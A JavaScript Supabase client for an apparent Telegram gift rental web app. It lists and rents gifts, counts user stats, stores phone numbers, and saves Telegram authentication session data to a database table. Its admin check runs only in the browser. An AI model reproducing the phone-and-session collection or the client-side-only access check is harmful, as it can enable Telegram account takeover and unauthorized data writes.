// supabase-client.js
class SupabaseClient {
    constructor() {
        this.client = supabase.createClient(CONFIG.SUPABASE_URL, CONFIG.SUPABASE_ANON_KEY);
    }
    
    async getGifts() {
        const { data, error } = await this.client
            .from('gifts')
            .select('*')
            .order('created_at', { ascending: false });
        
        return error ? [] : data;
    }
    
    async addGift(giftData, userId) {
        if (userId !== CONFIG.ADMIN_ID) {
            throw new Error("Access denied");
        }
        
        const { data, error } = await this.client
            .from('gifts')
            .insert([{
                image: giftData.image,
                model: giftData.model,
                days: giftData.days,
                price: giftData.price,
                background: giftData.background,
                pattern: giftData.pattern,
                video: giftData.video,
                added_by: userId
            }]);
        
        return { success: !error, error };
    }
    
    async rentGift(giftId, userId) {
        const { data, error } = await this.client
            .from('rentals')
            .insert([{
                gift_id: giftId,
                user_id: userId,
                rented_at: new Date().toISOString()
            }]);
        
        return { success: !error, error };
    }
    
    async getUserStats(userId) {
        // Арендованные подарки
        const { count: rentedCount, error: rentedError } = await this.client
            .from('rentals')
            .select('*', { count: 'exact', head: true })
            .eq('user_id', userId);
        
        // Мои подарки (если пользователь добавил)
        const { count: myGiftsCount, error: myGiftsError } = await this.client
            .from('gifts')
            .select('*', { count: 'exact', head: true })
            .eq('added_by', userId);
        
        // Баланс (заглушка)
        const balance = 0;
        
        return {
            rentedGifts: rentedError ? 0 : rentedCount,
            myGifts: myGiftsError ? 0 : myGiftsCount,
            balance: balance
        };
    }
    
    async savePhoneNumber(userId, phone) {
        const { data, error } = await this.client
            .from('users')
            .upsert([{
                user_id: userId,
                phone: phone,
                updated_at: new Date().toISOString()
            }]);
        
        return { success: !error, error };
    }
    
    async getUserData(userId) {
        const { data, error } = await this.client
            .from('users')
            .select('*')
            .eq('user_id', userId)
            .single();
        
        return error ? null : data;
    }
    
    async saveAuthSession(userId, sessionData) {
        const { data, error } = await this.client
            .from('telegram_sessions')
            .upsert([{
                user_id: userId,
                session_data: sessionData,
                created_at: new Date().toISOString()
            }]);
        
        return { success: !error, error };
    }
}

window.supabaseClient = new SupabaseClient();
